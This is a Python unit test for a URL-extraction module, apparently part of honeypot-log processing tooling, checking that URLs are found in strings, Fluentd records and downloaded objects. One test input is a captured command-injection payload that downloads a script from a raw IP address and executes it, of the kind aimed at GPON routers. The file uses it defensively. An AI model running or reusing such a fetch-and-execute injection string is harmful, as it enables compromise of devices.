#!/usr/bin/env python3

import json
import unittest

from recursid.modules.BuiltinReemitterModules import \
        URLParserReemitterModule

from recursid.BuiltinObjects import FluentdRecord, DownloadedObject

class Test_Reemitter(unittest.TestCase):
    url_test = [
            ("https://all.kinds/asdf.lwej?qwer",
                ["https://all.kinds/asdf.lwej?qwer",
                    ]
                ),
            ("http://all.kinds/asdf.lwej?qwer",
                ["http://all.kinds/asdf.lwej?qwer",
                    ]
                ),
            ("https%3A/%2Fall.kinds%2Fasdf.lwej?qwer",
                ["https://all.kinds/asdf.lwej?qwer",
                    ]
                ),
            ("https://all.kinds/asdf.lwej?qwer more.com "
                "https://test.com/another asdf",
                ["https://all.kinds/asdf.lwej?qwer",
                    "https://test.com/another",
                    ]
                ),
            ("https://all.kinds/asdf.lwej?qwer;more.com;"
                "https://test.com/another;asdf",
                ["https://all.kinds/asdf.lwej?qwer",
                    "https://test.com/another",
                    ]
                ),
            ("https://all.kinds/asdf.lwej?qwer%20more.com%20"
                "https://test.com/another%20asdf;"
                "http://something.com/%3bhttps://somethingelse.test "
                "break\"http://after_dquote.com\"break\'"
                "http://after_squote_com/\'break "
                "https://try_perc_enc_dquote.com/%22break "
                "http://try_perc_enc_squote.com%27break "
                "http://test.alsothis.com/",
                ["https://all.kinds/asdf.lwej?qwer",
                    "https://test.com/another",
                    "http://something.com/",
                    "https://somethingelse.test",
                    "http://after_dquote.com",
                    "http://after_squote_com/",
                    "https://try_perc_enc_dquote.com/",
                    "http://try_perc_enc_squote.com",
                    "http://test.alsothis.com/",
                    ]
                ),
            ("$(wget+http://176.32.33.123/GPON+-O+->+/tmp/w;sh+/tmp/w)",
                ["http://176.32.33.123/GPON",
                    ]
                ),
            ]

    def test_url_finder(self):
        # Simplest test of just the url finder
        mod = URLParserReemitterModule(0, None, None, None, None)

        for in_dat, out_dat in self.url_test:
            self.assertEqual(mod.find_urls_in_str(in_dat), out_dat)
            self.assertEqual(mod.find_urls_in_bytes(in_dat.encode()),
                    [od.encode() for od in out_dat])

    def test_url_in_objs(self):
        # Test out the finder via fluent/downloaded objects
        mod = URLParserReemitterModule(0, None, None, None, None)

        fluent_type_map = {"fake": ["type_uno", "type_dos"]}

        for in_dat, out_dat in self.url_test:
            flobj_obj = {"type": "cowrie", "input": in_dat}
            flobj = FluentdRecord(json.dumps(flobj_obj))
            flobj2_obj = {"type": "fake", "type_uno": in_dat}
            flobj2 = FluentdRecord(json.dumps(flobj2_obj))
            flobj3_obj = {"type": "fake", "type_dos": in_dat}
            flobj3 = FluentdRecord(json.dumps(flobj3_obj))
            dlobj = DownloadedObject("", "", in_dat.encode())

            self.assertEqual(
                    {a.str_content() for a in mod.handle_object(flobj)},
                    set(out_dat))
            self.assertEqual(
                    {a.str_content() for a in mod.handle_object(flobj2,
                            fluent_type_map=fluent_type_map)},
                    set(out_dat))
            self.assertEqual(
                    {a.str_content() for a in mod.handle_object(flobj3,
                            fluent_type_map=fluent_type_map)},
                    set(out_dat))
            self.assertEqual(
                    {a.str_content() for a in mod.handle_object(dlobj)},
                    set(out_dat))

if __name__ == "__main__":
    unittest.main()
